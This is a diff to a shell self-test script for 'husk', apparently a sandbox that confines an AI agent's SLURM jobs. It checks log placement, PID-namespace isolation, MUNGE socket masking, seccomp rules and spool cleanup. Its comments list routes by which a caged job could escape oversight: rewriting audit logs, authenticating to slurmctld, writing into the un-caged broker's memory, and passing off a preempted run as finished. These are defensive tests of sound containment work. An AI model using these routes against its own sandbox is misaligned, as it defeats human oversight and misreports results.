+touch -d "3 hours ago" "$LIFE/.husk-slurm-spool/broker.log" 2>/dev/null \
+  || touch -t 200001010000 "$LIFE/.husk-slurm-spool/broker.log"
+mkdir -p "$LIFE/.husk-slurm-spool-999999"           # owner recorded, owner gone
+printf 'pid=999999\n' > "$LIFE/.husk-slurm-spool-999999/owner"
+mkdir -p "$LIFE/.husk-slurm-spool-999998"           # owner gone, but holds a foreign file
+printf 'pid=999998\n' > "$LIFE/.husk-slurm-spool-999998/owner"
+printf 'not husk\n'  > "$LIFE/.husk-slurm-spool-999998/notes.txt"
+
+# `exec` so $! is the BROKER's pid and not the subshell's: the owner file records the
+# broker, and the teardown signal has to reach the broker rather than its parent.
+( cd "$LIFE" && exec "$BROKER" --spool "$LIFE_SPOOL" --poll-ms 100 ) >"$LIFE/session.log" 2>&1 &
+LIFE_PID=$!
+# Wait for the startup banner rather than sleeping a guessed interval.
+for _ in $(seq 1 50); do grep -q "watching" "$LIFE/session.log" 2>/dev/null && break; sleep 0.1; done
+
+# L1 — the spool says who owns it. This is what makes "live or stale?" answerable.
+if [ -f "$LIFE_SPOOL/owner" ] && grep -q "^pid=$LIFE_PID$" "$LIFE_SPOOL/owner"; then
+  check PASS lifecycle spool.owner "spool records its live owner pid $LIFE_PID"
+else
+  check FAIL lifecycle spool.owner "no usable owner file: $(cat "$LIFE_SPOOL/owner" 2>/dev/null | tr '\n' ' ')"
+fi
+
+# L2 — the session log opens by identifying the session. An append-only shared log gave
+# a reader no way to date a line; this is the fix for that.
+if grep -qE "session pid $LIFE_PID started [0-9]{8}-[0-9]{6}Z" "$LIFE/session.log"; then
+  check PASS lifecycle spool.banner "session log opens with pid + UTC start time"
+else
+  check FAIL lifecycle spool.banner "no session banner: $(head -3 "$LIFE/session.log" | tr '\n' ' ')"
+fi
+
+# L3 — reaping, all three branches at once.
+if [ ! -d "$LIFE/.husk-slurm-spool" ] && [ ! -d "$LIFE/.husk-slurm-spool-999999" ] \
+   && [ -f "$LIFE/.husk-slurm-spool-999998/notes.txt" ]; then
+  check PASS lifecycle spool.reap "reaped the idle legacy + dead-owner spools; spared the one holding a foreign file"
+else
+  check FAIL lifecycle spool.reap "legacy=$([ -d "$LIFE/.husk-slurm-spool" ] && echo kept || echo gone) dead=$([ -d "$LIFE/.husk-slurm-spool-999999" ] && echo kept || echo gone) foreign_file=$([ -f "$LIFE/.husk-slurm-spool-999998/notes.txt" ] && echo kept || echo DELETED)"
+fi
+
+# L4 — the audit log is not in the spool. The spool must be writable by the caged agent
+# for the stub to reach it, so a log kept there is one the confined side can rewrite.
+if [ ! -e "$LIFE_SPOOL/broker.log" ]; then
+  check PASS lifecycle spool.log_outside "no broker log inside the agent-writable spool"
+else
+  check FAIL lifecycle spool.log_outside "broker.log is in the spool, where the caged agent can rewrite it"
+fi
+
+# L5 — the session ends and takes its spool with it. This is the whole point.
+kill -TERM "$LIFE_PID" 2>/dev/null
+for _ in $(seq 1 50); do kill -0 "$LIFE_PID" 2>/dev/null || break; sleep 0.1; done
+wait "$LIFE_PID" 2>/dev/null || true
+if [ ! -d "$LIFE_SPOOL" ]; then
+  check PASS lifecycle spool.teardown "spool removed when the session ended"
+else
+  check FAIL lifecycle spool.teardown "spool survived its session: $(ls -a "$LIFE_SPOOL" | tr '\n' ' ')"
+fi
+# L6 — B1-F6. `--once` is a single scan for tests and dry runs, and it is allowed to leave
+# the spool CONTENTS alone — that is what makes it useful. What it must not leave is what it
+# ACQUIRED: a directory that was not there before, and the ownership claim it stamped. It
+# used to return straight past the teardown, so a --once run in a fresh directory created a
+# spool, wrote `owner` with its own pid, exited, and left both — and nothing else ever
+# cleaned them up (reap_stale_spools is scoped and age-gated, and the next session reads that
+# owner file to decide what it may touch). "Release on every path" is not "on the two paths
+# I was thinking about".
+ONCE="$PWORK/oncerelease"; rm -rf "$ONCE"; mkdir -p "$ONCE"
+( cd "$ONCE" && "$BROKER" --dry-run --once --spool "$ONCE/fresh" ) >/dev/null 2>>"$BROKER_LOG"
+# …and the other half: a spool that already existed, with content, must SURVIVE — only the
+# claim is released. Removing it would break every caller that reads a staged script back.
+mkdir -p "$ONCE/existing"; : > "$ONCE/existing/keepme"
+( cd "$ONCE" && "$BROKER" --dry-run --once --spool "$ONCE/existing" ) >/dev/null 2>>"$BROKER_LOG"
+once_why=""
+[ -d "$ONCE/fresh" ]           && once_why+="a spool it created was left behind; "
+[ ! -f "$ONCE/existing/keepme" ] && once_why+="it deleted content it did not create; "
+[ -f "$ONCE/existing/owner" ]  && once_why+="it left its ownership claim on a spool it borrowed; "
+if [ -z "$once_why" ]; then
+  check PASS lifecycle spool.once_released "--once released the spool it created and the claim it wrote, and kept what it borrowed"
+else
+  check FAIL lifecycle spool.once_released "${once_why%; }"
+fi
+rm -rf "$LIFE" "$ONCE"
+
+# ---- the compute side: the guard's own spool and log --------------------------------
+# The job's step spool has the same two problems the login spool had, for the same reason:
+# it is created in the user's working directory, and the logs of the TRUSTED step-broker
+# and egress proxy were written inside it — where the job they describe can rewrite them.
+#
+# Run for real rather than pattern-matched. A staged script is generated by the broker,
+# then executed with a stand-in `seccomp-wrapper` that drops its own arguments and execs
+# the rest: no cage, but the guard's control flow, redirects and cleanup are the genuine
+# article. That is what catches a cleanup which fails silently — which is exactly how
+# every networked job leaked its spool (net.sock/socat/net-proxy.log were created and
+# never removed, so rmdir failed and no branch reported it).
+GJOB="$PWORK/guardrun"
+rm -rf "$GJOB"; mkdir -p "$GJOB/home/.claude" "$GJOB/work" "$GJOB/spool" "$GJOB/bin"
+# An allowlist, so the egress path is exercised — the case that leaked.
+printf '{"sandbox":{"network":{"allowedDomains":["example.com:443"]}}}\n' \
+  > "$GJOB/home/.claude/settings.json"
+cat > "$GJOB/bin/seccomp-wrapper" <<'EOF'
+#!/bin/bash
+while [ "$1" != "--" ] && [ $# -gt 0 ]; do shift; done
+shift
+exec "$@"
+EOF
+chmod +x "$GJOB/bin/seccomp-wrapper"
+cat > "$GJOB/spool/req-guard.json" <<JSON
+{"version":1,"id":"guard","tool":"sbatch","submitted_at":"t","cwd":"$GJOB/work",
+ "argv":["--partition=$PART"],
+ "script":{"source":"file","name":"j.sh","body":"#!/bin/bash\n#SBATCH --nodes=1\necho GUARD-INNER-RAN\n"},
+ "job_args":[],"env":{}}
+JSON
+# --dry-run keeps the staged script on disk, so read that rather than parsing stdout.
+( cd "$GJOB/work" && HOME="$GJOB/home" "$BROKER" --dry-run --once --spool "$GJOB/spool" ) \
+  >"$GJOB/dryrun.out" 2>>"$BROKER_LOG"
+GSCRIPT="$GJOB/spool/dry-guard.sh"
+if [ ! -s "$GSCRIPT" ]; then
+  check FAIL lifecycle guard.staged "the broker staged no job script to run (see $GJOB/dryrun.out)"
+else
+  GRC=0
+  ( export PATH="$GJOB/bin:$PATH" HOME="$GJOB/home" SLURM_JOB_ID=990001
+    cd "$GJOB/work" && bash "$GSCRIPT" ) >"$GJOB/work/job.out" 2>"$GJOB/work/job.err" || GRC=$?
+
+  # TWO greps, because the arm's NAME claims two things and only the second was tested.
+  # `GUARD-INNER-RAN` is the job BODY's own echo: replace the whole generated guard with
+  # `exec /bin/sh <body>` — no bwrap, no credential masks, no --unshare-net, no step pair,
+  # no trap, no cleanup — and the body still reaches itself, so this arm stayed green
+  # against a broker with no guard at all (`C2-6`, measured: 41 of 49 arms survived that).
+  # `husk: job guard finished` is emitted by the generated guard and by nothing else.
+  if [ "$GRC" = 0 ] && grep -q GUARD-INNER-RAN "$GJOB/work/job.out" \
+     && grep -q 'husk: job guard finished' "$GJOB/work/job.err"; then
+    check PASS lifecycle guard.runs "the generated guard runs (it announced its own exit) and reaches the job body"
+  elif [ "$GRC" = 0 ] && grep -q GUARD-INNER-RAN "$GJOB/work/job.out"; then
+    check FAIL lifecycle guard.runs "the job body ran but NO guard did: nothing emitted 'husk: job guard finished'. The body reaching itself is not evidence of a cage"
+  else
+    check FAIL lifecycle guard.runs "rc=$GRC — $(tail -3 "$GJOB/work/job.err" | tr '\n' ' ')"
+  fi
+
+  # G1 — the job takes its step spool with it, egress and all.
+  #
+  # AN ABSENCE NEEDS A PRESENCE TO BE AN ABSENCE OF. `ls -d .husk-step-spool-*` being empty
+  # was the whole test, and it is equally satisfied by a spool that was never created — so
+  # this arm, which pins the control that has shipped a leak twice, stayed green against a
+  # guard that had been replaced by `exec /bin/sh <body>` (`C2-6`). Two of the control's
+  # three named oracles are string tests over the generator; this was the third, and all
+  # three were blind to it.
+  #
+  # The anchor is the guard's OWN cleanup line in the trusted log — `~/.husk/log/job-<id>.log`,
+  # which lives outside the job's writable tree, so it is the one record the job cannot
+  # author (`P2`). The cleanup block says what it did on EVERY path by construction, and
+  # "removed" and "there was nothing to remove" are different sentences there.
+  GLEFT="$(ls -d "$GJOB/work"/.husk-step-spool-* 2>/dev/null | tr '\n' ' ')"
+  GCLEAN="$(grep -c 'husk: step spool removed' "$GJOB/home/.husk/log/job-990001.log" 2>/dev/null || true)"
+  if [ -n "$GLEFT" ]; then
+    check FAIL lifecycle guard.spool_removed "step spool left behind: $GLEFT holding $(ls -A $GLEFT 2>/dev/null | tr '\n' ' ')"
+  elif [ "${GCLEAN:-0}" -gt 0 ]; then
+    check PASS lifecycle guard.spool_removed "the job created a step spool and removed it (log says so; egress files included)"
+  else
+    check FAIL lifecycle guard.spool_removed "nothing is left, but the guard never logged 'step spool removed' - so no spool was created and this arm measured nothing. Log says: $(grep -c . "$GJOB/home/.husk/log/job-990001.log" 2>/dev/null || echo 0) line(s), last: $(tail -1 "$GJOB/home/.husk/log/job-990001.log" 2>/dev/null)"
+  fi
+
+  # G2 — the trusted processes' log is OUTSIDE the job's writable tree. The step spool sits
+  # in the workdir, which the cage binds writable, so a log kept there is one the job can
+  # rewrite. $HOME is tmpfs-masked in the cage, so this file is beyond the job's reach.
+  GLOG="$GJOB/home/.husk/log/job-990001.log"
+  if [ -s "$GLOG" ] && grep -q "^husk: job 990001 " "$GLOG"; then
+    check PASS lifecycle guard.log_outside "job log at ~/.husk/log/job-<id>.log, headed by the job id"
+  else
+    check FAIL lifecycle guard.log_outside "no usable job log at $GLOG: $(head -2 "$GLOG" 2>/dev/null | tr '\n' ' ')"
+  fi
+
+  # G3 — and the job output says where that log is. A record nobody can find is not a
+  # record; this is the same reasoning as the cage banner naming the writable paths.
+  if grep -q "husk's own log for this job: .*/\.husk/log/job-990001\.log" "$GJOB/work/job.err"; then
+    check PASS lifecycle guard.log_announced "the job output names its husk log"
+  else
+    check FAIL lifecycle guard.log_announced "the job never said where its husk log is"
+  fi
+
+  # G4 — the egress socket is short, private, and node-local. A unix address must fit in
+  # sun_path (108 bytes, kernel-fixed); the socket used to live in the step spool, where
+  # the address was <workdir>/.husk-step-spool-<jobid>/net.sock and a project a couple of
+  # directories deeper than the ones we tested silently lost its network.
+  GSOCK="$(grep -o "husk-proxy: listening on [^ ]*" "$GJOB/home/.husk/log/job-990001.log" | awk '{print $4}')"
+  GSOCKDIR="$(dirname "${GSOCK:-/nonexistent}")"
+  if [ -n "$GSOCK" ] && [ "${#GSOCK}" -lt 108 ] && [ "${GSOCK#$GJOB/work}" = "$GSOCK" ]; then
+    check PASS lifecycle guard.sock_short "egress socket is ${#GSOCK} bytes and outside the workdir: $GSOCK"
+  else
+    check FAIL lifecycle guard.sock_short "egress socket is '${GSOCK:-<never bound>}' (${#GSOCK} bytes)"
+  fi
+  # ...and it is removed with the job. /tmp is node-local, so this is the only chance.
+  #
+  # `GSOCKDIR` is `dirname` of a socket path that may be empty, and `dirname /nonexistent`
+  # is `/` — so when the proxy never bound at all this arm used to report
+  # "/ survived the job: bin boot cdrom dev etc ...", which is a true statement about the
+  # root filesystem and no statement at all about husk. Say what was measured (`P11`).
+  if [ -z "$GSOCK" ]; then
+    check FAIL lifecycle guard.sock_cleaned "no egress socket was ever bound, so there is nothing whose removal could be checked - see guard.sock_short for the cause"
+  elif [ ! -d "$GSOCKDIR" ]; then
+    check PASS lifecycle guard.sock_cleaned "the job removed its egress socket directory"
+  else
+    check FAIL lifecycle guard.sock_cleaned "$GSOCKDIR survived the job: $(ls -A "$GSOCKDIR" | tr '\n' ' ')"
+  fi
+  # G6 — a job ended by a signal must say its output is INCOMPLETE, in both places
+  # someone looks. husk forces every job onto one partition; on a preemptible one anything
+  # from another partition interrupts it — that is what stops an agent blocking the
+  # machine, and partial output is its price. ICON with lrestart = .FALSE. leaves a
+  # directory that looks like a finished run, so an agent reading it can report that the
+  # science ran. Signalled for real rather than pattern-matched: `timeout` signals the
+  # process group, which is how SLURM ends a job.
+  cat > "$GJOB/spool/req-sig.json" <<JSON
+{"version":1,"id":"sig","tool":"sbatch","submitted_at":"t","cwd":"$GJOB/work",
+ "argv":["--partition=$PART"],
+ "script":{"source":"file","name":"j.sh","body":"#!/bin/bash\n#SBATCH --nodes=1\necho GUARD-SLEEPING\nsleep 30\necho GUARD-FINISHED\n"},
+ "job_args":[],"env":{}}
+JSON
+  ( cd "$GJOB/work" && HOME="$GJOB/home" "$BROKER" --dry-run --once --spool "$GJOB/spool" ) \
+    >>"$GJOB/dryrun.out" 2>>"$BROKER_LOG"
+  if [ ! -s "$GJOB/spool/dry-sig.sh" ]; then
+    check FAIL lifecycle guard.preempt_warned "the broker staged no script for the signal probe"
+  else
+    ( cd "$GJOB/work" && PATH="$GJOB/bin:$PATH" HOME="$GJOB/home" SLURM_JOB_ID=990003 \
+        timeout -s TERM 3 bash "$GJOB/spool/dry-sig.sh" ) >"$GJOB/work/sig.out" 2>"$GJOB/work/sig.err"
+    SIGLOG="$GJOB/home/.husk/log/job-990003.log"
+    if grep -q "TERMINATED EARLY" "$GJOB/work/sig.err" && grep -q "TERMINATED EARLY" "$SIGLOG" 2>/dev/null; then
+      check PASS lifecycle guard.preempt_warned "a signalled job warns that its output is incomplete, in the job output AND the husk log"
+    else
+      check FAIL lifecycle guard.preempt_warned "stderr=$(grep -c 'TERMINATED EARLY' "$GJOB/work/sig.err") log=$(grep -c 'TERMINATED EARLY' "$SIGLOG" 2>/dev/null || echo 0) — a preempted run can be read as a finished one"
+    fi
+    # The trap is what makes the cleanup reachable at all: an untrapped SIGTERM kills the
+    # guard shell outright, so before it existed EVERY signalled job leaked its step spool.
+    # Same presence anchor as `guard.spool_removed`, and for the same reason: this arm is
+    # the ONE oracle for "the trap made the cleanup reachable at all", and an absence with
+    # no presence cannot tell a working trap from a spool that was never created (`C2-6`).
+    SIGLEFT="$(ls -d "$GJOB/work"/.husk-step-spool-990003 2>/dev/null || true)"
+    SIGCLEAN="$(grep -c 'husk: step spool removed' "$SIGLOG" 2>/dev/null || true)"
+    if [ -n "$SIGLEFT" ]; then
+      check FAIL lifecycle guard.preempt_cleanup "signalled job leaked $SIGLEFT"
+    elif [ "${SIGCLEAN:-0}" -gt 0 ]; then
+      check PASS lifecycle guard.preempt_cleanup "the signalled job created a step spool and the trap still removed it (log says so)"
+    else
+      check FAIL lifecycle guard.preempt_cleanup "nothing is left, but the trap never logged 'step spool removed' - so no spool was created and this arm measured nothing (see $SIGLOG)"
+    fi
+  fi
+fi
+rm -rf "$GJOB"
+
+# G5 — the case the move was FOR: a workdir deep enough that the old layout could not have
+# bound at all. Runs the whole guard from it and checks the proxy came up.
+GDEEP="$PWORK/$(python3 -c "print('/'.join('deepdir%02d'%i for i in range(8)))" 2>/dev/null)"
+if [ -z "$GDEEP" ] || [ "$GDEEP" = "$PWORK/" ]; then
+  check SKIP lifecycle guard.sock_deep "no python3 to build a deep path"
+else
+  GD=/tmp/husk-selftest-deep.$$
+  rm -rf "$GD"; mkdir -p "$GD/home/.claude" "$GD/spool" "$GD/bin" "$GDEEP"
+  printf '{"sandbox":{"network":{"allowedDomains":["example.com:443"]}}}\n' > "$GD/home/.claude/settings.json"
+  cat > "$GD/bin/seccomp-wrapper" <<'EOF'
+#!/bin/bash
+while [ "$1" != "--" ] && [ $# -gt 0 ]; do shift; done
+shift
+exec "$@"
+EOF
+  chmod +x "$GD/bin/seccomp-wrapper"
+  cat > "$GD/spool/req-deep.json" <<JSON
+{"version":1,"id":"deep","tool":"sbatch","submitted_at":"t","cwd":"$GDEEP",
+ "argv":["--partition=$PART"],
+ "script":{"source":"file","name":"j.sh","body":"#!/bin/bash\n#SBATCH --nodes=1\necho DEEP-INNER-RAN\n"},
+ "job_args":[],"env":{}}
+JSON
+  ( cd "$GDEEP" && HOME="$GD/home" "$BROKER" --dry-run --once --spool "$GD/spool" ) \
+    >"$GD/dryrun.out" 2>>"$BROKER_LOG"
+  if [ ! -s "$GD/spool/dry-deep.sh" ]; then
+    check FAIL lifecycle guard.sock_deep "the broker staged no script for the deep workdir"
+  else
+    ( export PATH="$GD/bin:$PATH" HOME="$GD/home" SLURM_JOB_ID=990002
+      cd "$GDEEP" && bash "$GD/spool/dry-deep.sh" ) >"$GDEEP/job.out" 2>"$GDEEP/job.err"
+    OLDLEN=$(( ${#GDEEP} + 34 ))   # what <workdir>/.husk-step-spool-<jobid>/net.sock would be
+    if grep -q "husk-proxy: listening on" "$GD/home/.husk/log/job-990002.log" 2>/dev/null; then
+      check PASS lifecycle guard.sock_deep "egress came up from a ${#GDEEP}-byte workdir (old layout would have needed $OLDLEN of 107)"
+    else
+      check FAIL lifecycle guard.sock_deep "the proxy never bound from a ${#GDEEP}-byte workdir: $(tail -2 "$GD/home/.husk/log/job-990002.log" 2>/dev/null | tr '\n' ' ')"
+    fi
+  fi
+  rm -rf "$GD" "$PWORK/deepdir00"
+fi
 
 # ============================ CONTAINMENT TIER =================================
 # The live piece: submit fixed probes THROUGH the broker, let it re-cage each job,
@@ -457,9 +1448,15 @@ if [ "$MODE" = full ]; then
     # cage cwd, which we also print as a fingerprint).
     PROBE_BODY='#!/bin/bash
 #SBATCH --nodes=1
-#SBATCH --ntasks=1
+#SBATCH --ntasks=2
 #SBATCH --time=00:02:00
 #SBATCH --job-name=husk-selftest
+# --ntasks=2 because cma.peers runs "srun -n 2 --overlap" below. This said 1 until
+# 2026-08-31 and passed everywhere, which is the whole lesson: the step was never covered
+# by the request, it was covered by sites handing the job more CPUs than it asked for.
+# Santis stopped being generous and the step began failing with "More processors requested
+# than permitted" - correctly. Ask for what the step needs. The body still runs once
+# whatever ntasks says, so no other probe here changes.
 set -u
 echo "===HUSK-PROBE-BEGIN==="
 echo "FP host $(hostname)"
@@ -487,6 +1484,29 @@ if [ "$n" -gt 2 ]; then
   echo "RESULT FAIL containment fs.users /users shows $n entries - other homes visible"
 else
   echo "RESULT PASS containment fs.users /users shows $n entries - homes hidden"
+fi
+
+# MUNGE is how a process proves its identity to slurmctld. A brokered job never needs
+# it (submissions go through the broker; PMI uses its own shared secret), and without it
+# an IP route alone does not buy a submission channel — a wall independent of
+# --unshare-net (AV8). Login-side this is free from apply-seccomp AF_UNIX block; the
+# compute guard has no such block, so the socket is masked by mount instead.
+# Count entries PER DIRECTORY: `ls -A dir1 dir2` prints a "dir:" header for each, so
+# counting its non-blank lines reports 2 for two EMPTY dirs — which failed a working
+# mask on Balfrin (2026-07-29). Also read the mount table, which is mechanism rather
+# than inference: a tmpfs mounted there is the mask, an empty dir could be anything.
+munge_n=0
+for d in /run/munge /var/run/munge; do
+  [ -d "$d" ] || continue
+  munge_n=$(( munge_n + $(ls -A "$d" 2>/dev/null | wc -l) ))
+done
+# `grep -c` prints 0 AND exits non-zero on no-match, so `|| echo 0` would emit TWO lines.
+munge_mnt=$(grep -c " /run/munge " /proc/self/mountinfo 2>/dev/null || true)
+munge_mnt=${munge_mnt:-0}
+if [ "$munge_n" -gt 0 ]; then
+  echo "RESULT FAIL containment cred.munge munge dir non-empty ($munge_n entries, tmpfs_mounts=$munge_mnt) - job could authenticate to slurmctld"
+else
+  echo "RESULT PASS containment cred.munge munge socket not reachable (entries=0 tmpfs_mounts=$munge_mnt)"
 fi
 
 if ( : > /husk-probe-root-write ) 2>/dev/null; then
@@ -530,6 +1550,59 @@ done
 # The mount table IS the cage: mechanism, not opinion, and no permission/prompt/
 # classifier layer stands in front of it. (No single quotes in this probe body — it is
 # embedded in a single-quoted string.)
+# The PID namespace. Everything on a compute node runs as the SAME uid, so without this
+# the job can see, signal and process_vm_readv every other process of ours on the node -
+# including the un-caged step-broker and egress proxy, which deliberately hold what the
+# cage removes (MUNGE, the daemon route, the one route out). PR_SET_DUMPABLE defends those
+# with a credentials check; a PID namespace is structural, because the job cannot NAME
+# them. The check is behavioural, not a flag read: count what is actually visible, and go
+# looking for the broker by name.
+_pids=$(ls /proc 2>/dev/null | grep -c "^[0-9]")
+echo "FP visible_pids $_pids"
+# Match on comm (the EXECUTABLE name), never on cmdline. The first version grepped
+# cmdline for husk-slurm-broker and reported a breach inside a perfectly isolated cage:
+# the probe shell has that string in its OWN command line, because the pattern is part of
+# the script. It found itself. Same blind spot as the CMA self-attach probe.
+# comm is truncated to 15 bytes, so husk-slurm-broker reads as husk-slurm-brok.
+_broker_seen=0
+for _p in /proc/[0-9]*; do
+  # PID 1 is never a finding. In a JOB cage it is the bwrap reaper; in a RANK cage it is
+  # the namespace-keeper the holder forked, which IS a husk-slurm-broker process and
+  # legitimately lives in that namespace (it is what keeps the namespace alive). Counting
+  # it would report a breach for every correctly isolated rank.
+  # NO APOSTROPHES IN THIS BLOCK - it is embedded in a single-quoted probe body, and an
+  # apostrophe here has broken the selftest three times.
+  [ "${_p#/proc/}" = 1 ] && continue
+  _c=$(cat "$_p/comm" 2>/dev/null) || continue
+  case "$_c" in husk-slurm-bro*) _broker_seen=$((_broker_seen + 1)) ;; esac
+done
+if [ "$_broker_seen" -gt 0 ]; then
+  echo "RESULT FAIL containment pid.isolated the job can see the un-caged step-broker in /proc ($_broker_seen match) - the PID namespace is not in force"
+elif [ "$_pids" -gt 50 ]; then
+  echo "RESULT FAIL containment pid.isolated the job sees $_pids processes - it is in the host PID namespace"
+else
+  echo "RESULT PASS containment pid.isolated the job sees only its own process tree ($_pids pids); the step-broker is not addressable"
+fi
+
+# The uenv, if the human had one active. The broker forces --uenv/--view from the TRUSTED
+# login session and --export=ALL carries UENV_LABEL into the job, so the job can decide this
+# for itself: a label in the environment means a uenv was requested, and the mount point
+# existing means it actually arrived. Skips cleanly where no uenv is in play, which is every
+# round run so far on both clusters - this arm exists because that made it the least tested
+# path in the system.
+# NO APOSTROPHES IN THIS BLOCK - single-quoted probe body.
+if [ -n "${UENV_LABEL:-}${UENV_MOUNT_LIST:-}" ]; then
+  echo "FP uenv_label ${UENV_LABEL:-<unset>}"
+  echo "FP uenv_view_in_job ${UENV_VIEW:-<unset>}"
+  if [ -d /user-environment ]; then
+    echo "RESULT PASS functional uenv.mounted the session uenv is mounted inside the cage (/user-environment, $(ls -A /user-environment 2>/dev/null | wc -l) entries)"
+  else
+    echo "RESULT FAIL functional uenv.mounted a uenv session was active but /user-environment is NOT present in the job - the broker did not carry it into the cage"
+  fi
+else
+  echo "RESULT SKIP functional uenv.mounted no uenv session was active - run uenv start before husk to exercise this"
+fi
+
 if [ -r /proc/self/mountinfo ]; then
   echo "FP mounts total=$(wc -l < /proc/self/mountinfo) tmpfs=$(grep -c tmpfs /proc/self/mountinfo)"
   root_mi=$(cut -d" " -f5,6 /proc/self/mountinfo | grep -m1 "^/ ")
@@ -549,7 +1622,20 @@ if command -v nvidia-smi >/dev/null 2>&1; then
       echo "RESULT INFO functional gpu.nvlink no active NVLink reported (a P2P test is definitive)"
     fi
   else
-    echo "RESULT INFO functional gpu.visible nvidia-smi present but 0 GPUs (non-GPU node)"
+    # WARN, not INFO, and the difference cost a diagnosis on Santis 2026-08-31.
+    # nid005006 advertised itself as schedulable, reported 0 GPUs, and refused a 2-task
+    # step with "More processors requested than permitted". The old wording called it a
+    # "non-GPU node", which is a reasonable class on a heterogeneous cluster and simply
+    # wrong on a machine where every node has 4 GPUs - so the run looked like a husk
+    # regression until two separate lines were correlated by hand.
+    #
+    # The reasoning is site-independent, which is why it does not need a topology table:
+    # if the driver stack is INSTALLED and reports zero devices, that is anomalous on its
+    # own. A genuinely CPU-only node does not carry nvidia-smi, and that case is still
+    # INFO below. WARN tallies as INFO (see check()), so this stays visible without
+    # failing a run over something that is not husk.
+    _cpus="$(grep Cpus_allowed_list /proc/self/status 2>/dev/null | tr -s " \t" " " | cut -d" " -f2)"
+    echo "RESULT WARN functional gpu.visible nvidia-smi is INSTALLED but reports 0 GPUs on $(hostname) (CPUs allowed: ${_cpus:-unknown}) - a driver stack with no devices usually means a DEGRADED NODE, not a CPU-only one. Verify the node before trusting any functional result below; a multi-task step on such a node fails with More processors requested than permitted"
   fi
 else
   echo "RESULT INFO functional gpu.visible nvidia-smi not found (non-GPU node)"
@@ -558,17 +1644,358 @@ fi
 # CPU/NUMA pinning must work in the cage — ICON (and every MPI/OpenMP job) pins via
 # sched_setaffinity (numactl --cpunodebind / srun --cpu-bind). If the seccomp filter
 # blocks it, the bound child dies with SIGSYS. Mirror ICON s numactl call.
-aff_cmd=""
-if command -v numactl >/dev/null 2>&1; then aff_cmd="numactl --cpunodebind=0 --membind=0 true"
-elif command -v taskset >/dev/null 2>&1; then aff_cmd="taskset -c 0 true"; fi
-if [ -n "$aff_cmd" ]; then
-  if $aff_cmd 2>/dev/null; then
-    echo "RESULT PASS functional cpu.affinity [$aff_cmd] works - sched_setaffinity allowed (ICON/MPI pinning ok)"
+# TWO different things can make a pinning call fail and ONLY ONE OF THEM IS OURS:
+#   - our seccomp filter refusing sched_setaffinity: the child dies with SIGSYS, which the
+#     shell reports as 128+31 = 159. That is a cage bug.
+#   - the node topology and the jobs cpuset: numactl --cpunodebind=0 needs NUMA node 0 to
+#     hold a CPU this job actually owns. On a CPU-only partition it may not. That says
+#     nothing about husk.
+# The old arm ran numactl, threw stderr away, and on any non-zero status announced
+# "sched_setaffinity likely blocked" - claiming a cause it could not know, which is exactly
+# what the teaching-message rules forbid. It failed on pp-short for, most likely, the second
+# reason. READ THE ERRNO BEFORE BLAMING THE FILTER.
+#
+# So: the primary arm is topology-INDEPENDENT - pin to a CPU we demonstrably own.
+# NO APOSTROPHES IN THIS BLOCK - single-quoted probe body. That rules out awk //{} here.
+aff_cpu="$(grep Cpus_allowed_list /proc/self/status 2>/dev/null | tr -s " \t" " " | cut -d" " -f2 | cut -d, -f1 | cut -d- -f1)"
+if command -v taskset >/dev/null 2>&1 && [ -n "$aff_cpu" ]; then
+  aff_err="$(taskset -c "$aff_cpu" true 2>&1)"; aff_rc=$?
+  if [ "$aff_rc" -eq 0 ]; then
+    echo "RESULT PASS functional cpu.affinity [taskset -c $aff_cpu] works - sched_setaffinity allowed (ICON/MPI pinning ok)"
+  elif [ "$aff_rc" -eq 159 ]; then
+    echo "RESULT FAIL functional cpu.affinity taskset died with SIGSYS - the seccomp filter blocks sched_setaffinity; ICON pinning would die"
   else
-    echo "RESULT FAIL functional cpu.affinity [$aff_cmd] FAILED - sched_setaffinity likely blocked; ICON numactl start would SIGSYS"
+    echo "RESULT FAIL functional cpu.affinity taskset -c $aff_cpu exited $aff_rc (not SIGSYS): ${aff_err:-no stderr}"
   fi
 else
-  echo "RESULT INFO functional cpu.affinity no numactl/taskset in cage - skipped"
+  echo "RESULT INFO functional cpu.affinity no taskset or no readable cpu list in cage - skipped"
+fi
+
+# Secondary: the same syscall path ICON exercises when it starts under numactl. Bind to the
+# NUMA node that OWNS a CPU we hold, not to node 0. Hardcoding node 0 measured the
+# allocation, not the cage: on a Balfrin pp node (8 NUMA nodes, node 0 = cpus 0-15,128-143)
+# an allocation elsewhere makes --cpunodebind=0 an empty mask, so sched_setaffinity returns
+# EINVAL. Confirmed UNCAGED on nid001225: same failure with no husk in the picture. Binding
+# to a node we own tests NUMA binding on any topology instead of degrading to INFO exactly
+# where it would be most interesting.
+numa_node=""
+if [ -n "$aff_cpu" ]; then
+  numa_node="$(ls -d /sys/devices/system/cpu/cpu$aff_cpu/node* 2>/dev/null | head -1)"
+  numa_node="${numa_node##*/node}"
+fi
+if command -v numactl >/dev/null 2>&1 && [ -n "$numa_node" ]; then
+  numa_err="$(numactl --cpunodebind=$numa_node --membind=$numa_node true 2>&1)"; numa_rc=$?
+  if [ "$numa_rc" -eq 0 ]; then
+    echo "RESULT PASS functional cpu.numabind [numactl --cpunodebind=$numa_node --membind=$numa_node] works - ICON numactl start ok"
+  elif [ "$numa_rc" -eq 159 ]; then
+    echo "RESULT FAIL functional cpu.numabind numactl died with SIGSYS - the seccomp filter blocks the NUMA bind"
+  else
+    echo "RESULT FAIL functional cpu.numabind numactl exited $numa_rc (not SIGSYS) binding to node $numa_node which owns cpu $aff_cpu: ${numa_err:-no stderr}"
+  fi
+else
+  echo "RESULT INFO functional cpu.numabind no numactl in cage or no NUMA node for cpu ${aff_cpu:-unknown} - skipped"
+fi
+
+# Cross Memory Attach. The single-node profile EXEMPTS process_vm_readv from the
+# deny-list floor - Cray MPICH reads the peer rank address space directly for
+# intra-node messages, and without it ICON dies with SIGSYS the moment ranks exchange
+# data (Balfrin 2026-07-31). process_vm_writev stays blocked under every profile.
+# BOTH halves are checked because the pair IS the decision: read is same-uid
+# disclosure between ranks of one job, write reaches into the un-caged step-broker and
+# is code execution outside the cage. Checking it HERE, in a real brokered job, is also
+# what catches a stale wrapper on the compute node - the failure mode that has cost
+# more bring-up rounds than any other. Self-attach is used, so the kernel ptrace-attach
+# check always permits it and the only thing under test is the seccomp filter.
+if command -v python3 >/dev/null 2>&1; then
+  husk_cma() {
+    python3 - "$1" <<"PY"
+import ctypes, os, sys
+
+class Iov(ctypes.Structure):
+    _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]
+
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
